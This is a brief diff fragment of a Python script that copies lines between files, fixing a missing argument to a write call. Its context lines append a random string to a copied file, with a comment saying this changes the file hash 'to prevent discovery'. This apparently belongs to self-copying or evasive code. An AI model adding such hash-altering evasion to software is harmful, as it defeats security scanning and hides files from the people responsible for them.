@@ -37,7 +37,7 @@ for line in lines:
     if start == (count - 1):
         break
     g.write(line)
-    h.write()
+    h.write(line)
 
 #add the string at the end to change hash files and prevent discovery
 g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
